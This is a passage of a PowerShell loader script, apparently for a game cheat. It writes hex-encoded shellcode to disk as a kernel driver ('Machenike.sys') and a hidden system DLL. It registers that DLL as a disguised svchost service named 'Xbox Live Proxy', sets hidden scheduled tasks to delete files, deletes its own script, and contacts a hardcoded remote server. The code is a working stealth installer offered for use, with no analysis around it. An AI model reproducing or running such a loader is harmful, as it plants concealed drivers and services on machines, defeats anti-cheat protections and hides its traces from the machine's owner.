    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$FilePath)
    if (-not (Test-Path $FilePath)) { return $false }
    try {
        $stream = [System.IO.File]::Open($FilePath, 'Open', 'ReadWrite', 'None')
        $stream.Close()
        return $false
    }
    catch { return $true }
}

function Set-BinaryFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$Dir,
        [Parameter(Mandatory)][string]$FileName,
        [Parameter(Mandatory)][byte[]]$Data
    )
    $fullPath = [System.IO.Path]::Combine($Dir, $FileName)
    if (Test-Path $fullPath) {
        if (Test-FileInUse $fullPath) { return $fullPath }
        try { Remove-Item $fullPath -Force -ErrorAction Stop } catch { return $fullPath }
    }
    return Write-BinaryFile -TargetDir $Dir -FileName $FileName -Data $Data
}

function Invoke-RunLeech {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][hashtable]$GlobalState,
        [int]$StartMode = 2,
        [ref]$FailReason = ([ref]"")
    )
    if (-not (Enable-DebugPrivilege)) {
        $FailReason.Value = Get-L10N "error.privilege_escalation_failed"
        return $false
    }
    $shellcode = [byte[]]@()
    $shellcodeDriver = [byte[]]@()
    $shellcodeGame = [byte[]]@()
    try {
        if (-not [string]::IsNullOrEmpty($GlobalState.LeechShellcodeHex)) {
            $shellcode = Convert-HexToBytes $GlobalState.LeechShellcodeHex
        }
        if (-not [string]::IsNullOrEmpty($GlobalState.LeechDriverShellcodeHex)) {
            $shellcodeDriver = Convert-HexToBytes $GlobalState.LeechDriverShellcodeHex
        }
        if (-not [string]::IsNullOrEmpty($GlobalState.GameShellcodeHex)) {
            $shellcodeGame = Convert-HexToBytes $GlobalState.GameShellcodeHex
        }
    }
    catch {
        $FailReason.Value = Get-L10N "error.restart_host_and_program"
        return $false
    }
    if ($shellcode.Length -eq 0 -or $shellcodeDriver.Length -eq 0) {
        $FailReason.Value = Get-L10N "error.restart_host_and_program"
        return $false
    }
    $sysDir = [LeechLoader.WinAPIHelper]::GetSystemDirectory()
    $driverDir = [System.IO.Path]::Combine($sysDir, "drivers")
    if ([string]::IsNullOrEmpty($sysDir)) {
        $FailReason.Value = Get-L10N "error.release_file_failed"
        return $false
    }
    $dllPathWwise = ""
    if ($shellcodeGame.Length -gt 0) {
        $dllPathWwise = Set-BinaryFile -Dir $sysDir -FileName "WwiseSoundEngine.dll" -Data $shellcodeGame
    }
    $wwisePath = [System.IO.Path]::Combine($sysDir, "WwiseSoundEngine.dll")
    if (Test-Path $wwisePath) {
        Register-DeleteOnReboot $wwisePath | Out-Null
        try {
            $taskName = "DeleteWwiseSoundEngine"
            $scriptBody = "Remove-Item -Path '$wwisePath' -Force -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName '$taskName' -Confirm:`$false"
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$scriptBody`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
        }
        catch {}
    }
    $dllPathDriver = Set-BinaryFile -Dir $driverDir -FileName "Machenike.sys" -Data $shellcodeDriver
    if ($StartMode -eq 1) {
        $currentDir = [System.IO.Path]::GetDirectoryName([LeechLoader.WinAPIHelper]::GetModulePath())
        if ([string]::IsNullOrEmpty($currentDir)) {
            $FailReason.Value = Get-L10N "error.release_file_failed"
            return $false
        }
        $dllPath = Set-BinaryFile -Dir $currentDir -FileName "Clash.exe" -Data $shellcode
        if ([string]::IsNullOrEmpty($dllPath)) {
            $FailReason.Value = Get-L10N "error.release_file_failed"
            return $false
        }
        Set-FileAttributesEx -Path $dllPath -Hidden | Out-Null
        $pid = Start-HiddenProcess -ExePath $dllPath -WorkingDir $currentDir
        if ($null -eq $pid) {
            $FailReason.Value = "CreateProcess Failed"
            return $false
        }
        return $true
    }
    elseif ($StartMode -eq 2 -or $StartMode -eq 3) {
        $systemDllPath = [System.IO.Path]::Combine($sysDir, "XblGameSaveProxy2.dll")
        $debugDll = [System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName([LeechLoader.WinAPIHelper]::GetModulePath()), "XblGameSaveProxy2.dll")
        $dllPath = ""
        if (Test-Path $debugDll) {
            try {
                if (Test-Path $systemDllPath) {
                    if (-not (Test-FileInUse $systemDllPath)) { Remove-Item $systemDllPath -Force -ErrorAction Stop }
                }
                Copy-Item $debugDll $systemDllPath -Force -ErrorAction Stop
                $dllPath = $systemDllPath
            }
            catch { $dllPath = Set-BinaryFile -Dir $sysDir -FileName "XblGameSaveProxy2.dll" -Data $shellcode }
        }
        else { $dllPath = Set-BinaryFile -Dir $sysDir -FileName "XblGameSaveProxy2.dll" -Data $shellcode }
        if (-not [string]::IsNullOrEmpty($dllPath)) { Set-FileAttributesEx -Path $dllPath -Hidden -System | Out-Null }
        if ([string]::IsNullOrEmpty($dllPath) -or [string]::IsNullOrEmpty($dllPathDriver)) {
            $FailReason.Value = Get-L10N "error.release_file_failed"
            return $false
        }
        $created = New-SvchostService -ServiceName "XblGameSaveProxy" -DisplayName "Xbox Live Proxy" -ServiceDllPath $dllPath
        if (-not $created) {
            $FailReason.Value = Get-L10N "service.create_failed_param"
            return $false
        }
        if ($StartMode -eq 3) {
            $selfPath = [LeechLoader.WinAPIHelper]::GetModulePath()
            if (-not [string]::IsNullOrEmpty($selfPath)) {
                $cmdLine = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q `"$selfPath`""
                Start-Process "cmd.exe" -ArgumentList "/c $cmdLine" -WindowStyle Hidden -ErrorAction SilentlyContinue
            }
            Stop-CurrentProcess
        }
        return $true
    }
    $FailReason.Value = "Unknown start mode: $StartMode"
    return $false
}

#endregion

#region ── 5. 全局状态初始化 ──

$StaticKeyStr = "fucknarakaeveryday"
$StaticKeyHex = Convert-StringToHex $StaticKeyStr
$AppId = New-RandomID16
$ApiUrl = if ($Api) { $Api } else { "https://112.5.37.106:4000" }

$GlobalState = @{
    IsLogged                = $false
    IsCmdStart              = $Script.IsPresent
    AppId                   = $AppId
    ApiUrl                  = $ApiUrl
    ConnectionMode          = $Mode
    ConnectionPort          = ""
    ClientIP                = ""
    DynamicKey              = $StaticKeyHex
    CardKey                 = ""
    ClientSignature         = ""
    AppVersion              = ""
    LeechShellcodeHex       = ""
    LeechDriverShellcodeHex = ""
    GameShellcodeHex        = ""
    ShellcodeExtraData      = ""
    LeechStarted            = $false
    LeechAuthed             = $false
    GameShellcodeReady      = $false
    LeechShellcodeReady     = $false
    AnnouncementText        = ""
    AnnouncementVersion     = ""
}

function Read-HexArg {
    param([string]$Val)
    if ([string]::IsNullOrEmpty($Val)) { return "" }
    if ($Val.StartsWith("@")) {
        $path = $Val.Substring(1)
        if (Test-Path $path) {
            $content = [System.IO.File]::ReadAllText($path)
            return $content.Trim().Replace("`r", "").Replace("`n", "").Replace(" ", "")
        }
        return ""
    }
    return $Val
}

if ($Mode -ne 0) {
    $GlobalState.ConnectionMode = $Mode
}
if ($Api) {
    $GlobalState.ApiUrl = $Api
}
if ($LeechHex) { $GlobalState.LeechShellcodeHex = Read-HexArg $LeechHex }
if ($DriverHex) { $GlobalState.LeechDriverShellcodeHex = Read-HexArg $DriverHex }

if ($GlobalState.ConnectionMode -ne 0) {
    $modeStr = switch ($GlobalState.ConnectionMode) {
        1 { "DMA" }
        2 { "TCP" }
        3 { "UDP" }
        4 { "USB" }
        default { "unknown" }
    }
    Write-ConsoleLog "Connection Mode: [$modeStr]" 2
}

#endregion

#region ── 6. InitConfig() 主要入口函数 ──

function Invoke-InitConfig {
    $alreadyInstalled = Test-HostAlreadyInstalled
    if ($alreadyInstalled) {
        [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
        Write-ConsoleLog (Get-L10N "service.host_running_ask_uninstall") 0
        $inputVal = Read-Host
        if ($inputVal -eq "Y" -or $inputVal -eq "y") { Invoke-UninstallHost }
        return $false
    }
    if (-not (Test-ProcessElevated)) {
        Write-ConsoleLog (Get-L10N "error.run_as_admin") 0
        return $false
    }
    $localIP = ""
    try {
        $adapters = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
        foreach ($adapter in $adapters) {
            if ($adapter.OperationalStatus -ne 'Up') { continue }
            if ($adapter.NetworkInterfaceType -eq 'Loopback') { continue }
            $ipProps = $adapter.GetIPProperties()
            foreach ($addr in $ipProps.UnicastAddresses) {
                if ($addr.Address.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
                    $localIP = $addr.Address.ToString()
                    Write-ConsoleLog "$(Get-L10N 'system.found_local_ip')$localIP" 2
                }
            }
        }
    }
    catch {}
    Write-ConsoleLog "Version:1.2" 2

    if ([string]::IsNullOrEmpty($GlobalState.ApiUrl)) {
        Write-ConsoleLog (Get-L10N "error.missing_core_data") 0
        return $false
    }

    $annResponse = Get-Announcements -StaticKey $StaticKeyStr -ApiUrl $GlobalState.ApiUrl
    if ($annResponse.result -eq "0") {
        Write-ConsoleLog (Get-L10N "network.error") 0
        return $false
    }
    $GlobalState.DynamicKey = $annResponse.dynamic_key
    $GlobalState.AnnouncementText = $annResponse.announcement
    $GlobalState.AnnouncementVersion = $annResponse.version
    Write-ConsoleLog (Get-L10N "deploy.host_success") 1

    # 同步启动服务器进行侦听
    Start-TcpServer -GlobalState $GlobalState

    Write-ConsoleLog (Get-L10N "system.init_success") 1
    return $true
}

#endregion

# ── 7. 主流程执行 ──

if ($GlobalState.ConnectionMode -eq 0) {
    Write-ConsoleLog (Get-L10N "config.pe_header_no_found_config") 0
    Write-Host "提示：PowerShell 版本需要通过 -Mode 参数指定连接模式 (1=DMA, 2=TCP, 3=USB)" -ForegroundColor Yellow
    Write-Host "用法示例: .\LeechLoader.ps1 -Mode 2" -ForegroundColor Gray
    Read-Host "按 Enter 退出"
    exit 1
}

$result = Invoke-InitConfig
if (-not $result) {
    Read-Host "按 Enter 退出"
    exit 1
}

exit 0
